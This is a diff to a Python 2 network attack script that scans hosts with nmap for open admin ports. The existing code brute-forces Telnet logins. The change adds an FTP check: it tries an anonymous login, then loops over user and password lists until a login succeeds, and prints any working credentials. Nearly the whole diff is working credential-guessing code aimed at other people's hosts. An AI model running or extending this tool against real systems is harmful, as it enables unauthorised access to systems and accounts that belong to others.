@@ -2,6 +2,7 @@ import sys
 import nmap
 from termcolor import colored
 import telnetlib
+from ftplib import FTP
 
 
 lhosts = []  # writes live hosts that are found here
@@ -54,6 +55,7 @@ def live_hosts(nm):
 
 
 # Function scans for common admin ports that might be open
+# TODO: add multi-threading to speed up scan
 def admin_scanner(nm):
     print "[*] scanning for open admin ports..."
     x = 0
@@ -82,6 +84,8 @@ def check_vports():
     print "[*] testing vulnerable host ip address..."
     for vhost in vhosts:
         for port in vhost.ports:
+            if port == 21:
+                check_ftp(vhost)
             if port == 23:
                 check_telnet(vhost)
 
@@ -95,9 +99,6 @@ def check_telnet(vhost):
         x = 0
         while x < len(passwords):
             try:
-                # print host  # for debug
-                # print user  # for debug
-                # print passwords[x]  # for debug
                 t = telnetlib.Telnet(host, 23, 1)  # open telnet connection(ipaddr, port, timeout)
                 t.read_until("login: ")
                 t.write(user + "\n")
@@ -109,11 +110,42 @@ def check_telnet(vhost):
                 # sys.stdout.write(po)  for debug purposes
                 if "logout" in po:
                     print "[!] Password found! < {0} >".format(colored(passwords[x], 'yellow'))
-                    exit(0)
                 x += 1
-            except Exception as e:
+            except Exception:
                 x += 1
                 # print "[!] ", e  # prints thrown exception, for debug
+    # TODO: add break here to end test
+
+def check_ftp(vhost):
+    print "[*] testing ftp connection..."
+    host = vhost.ip
+    anon = False
+    try:
+        f = FTP(host)
+        f.login()
+        f.quit()
+        print "[+] Anonymous ftp connection successful."
+        anon = True
+    except Exception as e:
+        print "[!] Anonymous login failed: {0}".format(e)
+        pass
+    if anon == False:
+        success = False
+        while success == False:
+            for user in users:
+                x = 0
+                while x < len(passwords):
+                    try:
+                        f = FTP(host)
+                        f.login(user, passwords[x])
+                        f.close()
+                        print "[!] Success! user: {0}, password: {1}".format(colored(user, 'yellow'), colored(passwords[x], 'green'))
+                        success = True
+                        break
+                    except Exception as e:
+                        # print "[!] Something went wrong: {0}".format(e)
+                        x += 1
+                break 
 
 
 def main():
